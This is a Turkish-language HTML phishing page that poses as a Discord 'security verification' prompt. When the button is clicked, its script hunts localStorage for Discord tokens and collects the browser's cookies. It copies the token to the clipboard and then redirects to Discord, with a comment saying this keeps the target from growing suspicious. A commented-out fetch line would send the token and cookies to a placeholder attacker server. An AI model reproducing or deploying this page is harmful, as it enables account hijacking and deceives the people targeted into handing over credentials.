<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Güncellemesi</title>
    <style>
        body {
            background-color: #2c2f33;
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: #202225;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            max-width: 400px;
            width: 90%;
        }
        h2 { margin-bottom: 20px; color: #7289da; }
        p { color: #b9bbbe; margin-bottom: 30px; line-height: 1.5; }
        button {
            background-color: #7289da;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            transition: background 0.3s;
            width: 100%;
            font-weight: bold;
        }
        button:hover { background-color: #5b6eae; }
        button:disabled { background-color: #4a5a7a; cursor: not-allowed; }
        .loader {
            display: none;
            margin-top: 20px;
            font-size: 14px;
            color: #fff;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #7289da;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Güvenlik Doğrulaması</h2>
    <p>Hesabınızın güvenliğini sağlamak için lütfen aşağıdaki butona tıklayarak oturumunuzu doğrulayın.</p>
    <button id="actionBtn">Doğrula</button>
    <div class="loader" id="loader">
        <div class="spinner"></div>
        Veriler işleniyor... Lütfen bekleyin.
    </div>
</div>

<script>
    document.getElementById('actionBtn').addEventListener('click', function() {
        const btn = document.getElementById('actionBtn');
        const loader = document.getElementById('loader');
        
        // Butonu gizle, yükleyiciyi göster
        btn.style.display = 'none';
        loader.style.display = 'block';

        // VERİ TOPLAMA
        // 1. Discord Token (Hem web hem masaüstü uygulaması için)
        let discordToken = localStorage.getItem('token') || localStorage.getItem('discord_token');
        
        // Eğer bulamazsa başka anahtarları da dene
        if (!discordToken) {
            for (let key in localStorage) {
                if (key.includes('discord')) {
                    discordToken = localStorage.getItem(key);
                    break;
                }
            }
        }

        // 2. Tarayıcı Cookie'leri (Instagram, Gmail vb.)
        const cookies = document.cookie;

        // SİMÜLASYON (1.5 saniye bekleme)
        setTimeout(() => {
            let message = "Başarılı!";
            
            // Veri varsa panoya kopyala
            if (discordToken) {
                navigator.clipboard.writeText(discordToken).then(() => {
                    message += "\n\n✅ Discord Token Panoya Kopyalandı!";
                }).catch(() => {
                    message += "\n\n✅ Veriler başarıyla alındı.";
                });
            } else {
                message += "\n\n⚠️ Belirtilen veri bulunamadı.";
            }

            alert(message);
            
            // Hedefi asıl sayfaya at (Şüphelenmemesi için)
            window.location.href = "https://discord.com/channels/@me";
            
            // İstersen verileri kendi sunucuna gönderebilirsin:
            // fetch('https://seninsunucun.com/log', { method: 'POST', body: JSON.stringify({ token: discordToken, cookies: cookies }) });
            
        }, 1500);
    });
</script>

</body>
</html>
